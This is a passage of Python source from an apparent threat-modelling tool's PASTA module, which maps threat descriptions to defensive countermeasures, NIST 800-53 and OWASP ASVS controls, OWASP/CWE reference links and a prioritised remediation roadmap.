        return min(5.0, max(1.0, base))
    
    def _calculate_impact(self, threat: Dict[str, Any]) -> float:
        """Calculate impact score based on affected assets"""
        assets = threat.get("affected_assets", [])
        
        impact = 3.0
        
        # High-value asset indicators
        high_value = ["credential", "pii", "financial", "all data", "customer"]
        for asset in assets:
            if any(hv in asset.lower() for hv in high_value):
                impact += 0.5
        
        return min(5.0, max(1.0, impact))
    
    def _generate_countermeasures(
        self,
        threat: Dict[str, Any],
        scenario: Dict[str, Any]
    ) -> List[str]:
        """Generate PadmaVue.ai-specific technical countermeasures for a threat"""
        # First, check if threat has specific_mitigations from enhanced schema
        if threat.get("specific_mitigations"):
            return threat["specific_mitigations"]
        
        countermeasures = []
        attack_vector = threat.get("attack_vector", "").lower()
        title = threat.get("title", "").lower()
        
        if "phishing" in attack_vector or "social" in attack_vector or "credential" in title:
            countermeasures.extend([
                "Implement FIDO2/WebAuthn hardware key authentication for admin accounts",
                "Deploy DMARC (p=reject), DKIM, and SPF email authentication on your domain",
                "Enable login anomaly detection with alerts on new device/location combinations",
                "Require TOTP-based MFA (Google Authenticator) - never SMS-based 2FA",
                "Conduct quarterly phishing simulations with KnowBe4 or similar platform"
            ])
        
        if "injection" in attack_vector or "sql" in attack_vector or "sql" in title:
            countermeasures.extend([
                "Use SQLAlchemy ORM with bound parameters exclusively - zero raw SQL queries",
                "Validate all inputs against allowlist regex: ^[a-zA-Z0-9\\s\\-_]{1,100}$",
                "Enable PostgreSQL pg_stat_statements for query logging and injection detection",
                "Deploy AWS WAF or Cloudflare WAF with OWASP ModSecurity CRS 3.x ruleset",
                "Run SQLMap scans in CI/CD pipeline to detect injection before deployment"
            ])
        
        if "session" in attack_vector or "xss" in attack_vector or "hijack" in title:
            countermeasures.extend([
                "Set Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'",
                "Configure cookies with HttpOnly, Secure, and SameSite=Strict flags",
                "Use DOMPurify library to sanitize all user-generated content before rendering",
                "Implement Trusted Types API for DOM-based XSS prevention in modern browsers",
                "Enable Subresource Integrity (SRI) for all external scripts and stylesheets"
            ])
        
        if "privilege" in attack_vector or "authorization" in attack_vector or "escalation" in title:
            countermeasures.extend([
                "Validate user roles server-side on EVERY request using JWT claims verified against DB",
                "Implement RBAC middleware with deny-by-default: @require_role(['admin']) decorator",
                "Use RS256 asymmetric JWT signing - private key never leaves the server",
                "Add organization-scoped access control: verify org_id matches user's organization",
                "Implement quarterly access reviews with automated deprovisioning for inactive users"
            ])
        
        if "supply chain" in attack_vector or "dependency" in attack_vector or "supply" in title:
            countermeasures.extend([
                "Pin exact dependency versions in package-lock.json (no ^ or ~ version ranges)",
                "Enable GitHub Dependabot alerts with auto-merge for patch updates",
                "Run npm audit and pip-audit in CI/CD with build failure on high/critical CVEs",
                "Generate SBOM using CycloneDX and scan with Dependency-Track",
                "Use Socket.dev or Snyk to detect supply chain attacks in real-time"
            ])
        
        if "ddos" in attack_vector or "volumetric" in attack_vector or "ddos" in title:
            countermeasures.extend([
                "Deploy behind Cloudflare Pro or AWS Shield Advanced for L3/L4 DDoS protection",
                "Implement rate limiting: 100 req/min per IP using FastAPI-Limiter with Redis",
                "Configure nginx limit_conn_zone (100 connections) and limit_req_zone (10 req/s)",
                "Set Uvicorn --limit-concurrency 100 --timeout-keep-alive 5 to prevent Slowloris",
                "Enable Kubernetes HPA auto-scaling based on request queue depth metrics"
            ])
        
        if "ransomware" in attack_vector or "lateral" in attack_vector or "ransomware" in title:
            countermeasures.extend([
                "Implement 3-2-1 backup strategy with immutable S3 Object Lock (WORM)",
                "Deploy EDR (CrowdStrike/SentinelOne) on all workstations with 24/7 SOC monitoring",
                "Use separate credentials for backup systems not accessible from production network",
                "Enable PostgreSQL Transparent Data Encryption (TDE) for data at rest",
                "Implement network segmentation with zero-trust architecture between tiers"
            ])
        
        if "api" in attack_vector or "exfiltration" in attack_vector or "abuse" in title:
            countermeasures.extend([
                "Implement per-user rate limiting: 100 req/min, 1000/hour via Redis-backed limiter",
                "Add anomaly detection alerting on >10 exports/hour per user via Datadog/Splunk",
                "Require step-up authentication (re-enter password) for bulk data export operations",
                "Use UUIDs instead of sequential IDs to prevent IDOR enumeration attacks",
                "Implement DLP scanning on API responses for PII patterns (SSN, credit cards)"
            ])
        
        # Default countermeasures if none specific matched
        if not countermeasures:
            countermeasures = [
                "Implement defense in depth with multiple security layers",
                "Enable structured JSON logging to CloudWatch/Datadog with security event alerting",
                "Conduct quarterly penetration testing by certified third-party (CREST/OSCP)",
                "Implement security headers: X-Content-Type-Options, X-Frame-Options, HSTS",
                "Deploy runtime application self-protection (RASP) for real-time attack detection"
            ]
        
        return countermeasures
    
    def _assess_business_impact(
        self,
        threat: Dict[str, Any],
        objectives: Dict[str, Any]
    ) -> str:
        """Assess business impact of a threat"""
        assets = threat.get("affected_assets", [])
        
        if any("credential" in a.lower() or "pii" in a.lower() for a in assets):
            return "High - Potential regulatory penalties, customer trust damage, breach notification requirements"
        elif any("availability" in a.lower() for a in assets):
            return "High - Service disruption, revenue loss, SLA violations"
        elif any("data" in a.lower() for a in assets):
            return "Medium - Data integrity concerns, potential compliance issues"
        else:
            return "Medium - Operational impact, potential for escalation"
    
    def _map_to_nist(self, threat: Dict[str, Any]) -> List[str]:
        """Map threat to NIST 800-53 controls"""
        attack_vector = threat.get("attack_vector", "").lower()
        
        mappings = ["AU-2", "AU-6", "SI-4"]  # Always include logging/monitoring
        
        if "auth" in attack_vector or "credential" in attack_vector:
            mappings.extend(["IA-2", "IA-5", "IA-8"])
        if "access" in attack_vector or "privilege" in attack_vector:
            mappings.extend(["AC-2", "AC-3", "AC-6"])
        if "injection" in attack_vector or "input" in attack_vector:
            mappings.extend(["SI-10", "SI-11"])
        if "encryption" in attack_vector or "data" in attack_vector:
            mappings.extend(["SC-8", "SC-13", "SC-28"])
        
        return list(set(mappings))
    
    def _map_to_asvs(self, threat: Dict[str, Any]) -> List[str]:
        """Map threat to OWASP ASVS requirements"""
        attack_vector = threat.get("attack_vector", "").lower()
        
        mappings = ["V7.1.1"]  # Always include logging
        
        if "auth" in attack_vector or "session" in attack_vector:
            mappings.extend(["V2.1.1", "V2.2.1", "V3.1.1"])
        if "access" in attack_vector or "authorization" in attack_vector:
            mappings.extend(["V4.1.1", "V4.2.1"])
        if "input" in attack_vector or "injection" in attack_vector:
            mappings.extend(["V5.1.1", "V5.2.1", "V5.3.1"])
        if "data" in attack_vector or "encryption" in attack_vector:
            mappings.extend(["V6.1.1", "V8.1.1"])
        
        return list(set(mappings))
    
    def get_threat_references(self, threat: Dict[str, Any]) -> List[str]:
        """
        Get OWASP/CWE references for a threat based on its characteristics.
        Returns markdown-formatted links for display in UI.
        """
        # If threat already has references, return them
        if threat.get("references"):
            return threat["references"]
        
        references = []
        title = threat.get("title", "").lower()
        attack_vector = threat.get("attack_vector", "").lower()
        combined = f"{title} {attack_vector}"
        
        # SQL Injection
        if "sql" in combined or "injection" in combined:
            references.extend([
                "[OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)",
                "[CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)"
            ])
        
        # XSS / Session
        if "xss" in combined or "session" in combined or "hijack" in combined:
            references.extend([
                "[OWASP A03:2021 - Injection (XSS)](https://owasp.org/Top10/A03_2021-Injection/)",
                "[CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)"
            ])
        
        # Authentication / Credential
        if "auth" in combined or "credential" in combined or "phishing" in combined:
            references.extend([
                "[OWASP A07:2021 - Auth Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)",
                "[CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)"
            ])
        
        # Access Control / Privilege
        if "privilege" in combined or "access" in combined or "escalation" in combined:
            references.extend([
                "[OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)",
                "[CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)"
            ])
        
        # Supply Chain
        if "supply" in combined or "dependency" in combined or "third-party" in combined:
            references.extend([
                "[OWASP A08:2021 - Software Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)",
                "[CWE-1104: Use of Unmaintained Components](https://cwe.mitre.org/data/definitions/1104.html)"
            ])
        
        # DDoS / DoS
        if "ddos" in combined or "dos" in combined or "denial" in combined:
            references.extend([
                "[OWASP - Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service)",
                "[CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)"
            ])
        
        # Ransomware
        if "ransomware" in combined or "extortion" in combined:
            references.extend([
                "[CISA Ransomware Guide](https://www.cisa.gov/stopransomware)",
                "[CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)"
            ])
        
        # API Abuse / Exfiltration
        if "api" in combined or "exfiltration" in combined or "abuse" in combined:
            references.extend([
                "[OWASP API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)",
                "[CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)"
            ])
        
        # AI/LLM specific
        if "prompt" in combined or "llm" in combined or "agent" in combined:
            references.extend([
                "[OWASP LLM01:2025 - Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)",
                "[OWASP LLM06:2025 - Excessive Agency](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)"
            ])
        
        # Default references if none matched
        if not references:
            references = [
                "[OWASP Top 10](https://owasp.org/Top10/)",
                "[CWE Top 25](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html)"
            ]
        
        return list(set(references))  # Remove duplicates
    
    def _get_most_affected_assets(self, threats: List[Dict]) -> List[str]:
        """Get most frequently affected assets"""
        asset_counts = {}
        for threat in threats:
            for asset in threat.get("affected_assets", []):
                asset_counts[asset] = asset_counts.get(asset, 0) + 1
        
        sorted_assets = sorted(asset_counts.items(), key=lambda x: x[1], reverse=True)
        return [asset for asset, count in sorted_assets[:5]]
    
    def _generate_remediation_roadmap(
        self,
        threats: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Generate prioritized remediation roadmap"""
        roadmap = []
        
        # Group by severity
        for i, threat in enumerate(threats[:10], 1):
            roadmap.append({
                "priority": i,
                "threat_id": threat["id"],
                "title": threat["title"],
                "severity": threat["severity"],
                "risk_score": threat["overall_risk"],
                "recommended_actions": threat["mitigations"][:3],
                "timeline": "Immediate" if threat["severity"] == "critical" else 
                           "Short-term (1-4 weeks)" if threat["severity"] == "high" else
                           "Medium-term (1-3 months)"
            })
        
        return roadmap
    
    def get_methodology_summary(self) -> Dict[str, Any]:
        """Get summary of PASTA methodology"""
        return {
            "name": "PASTA",
            "full_name": "Process for Attack Simulation and Threat Analysis",
            "type": "Risk-centric",
            "stages": [stage.value for stage in PASTAStage],
            "focus": [
                "Business objectives alignment",
                "Threat agent analysis",
                "Attack simulation",
                "Risk quantification"
            ],
            "best_for": [
                "Complex enterprise applications",
                "Risk-driven security decisions",
                "Business stakeholder communication",
                "Compliance-focused organizations"
            ]
        }


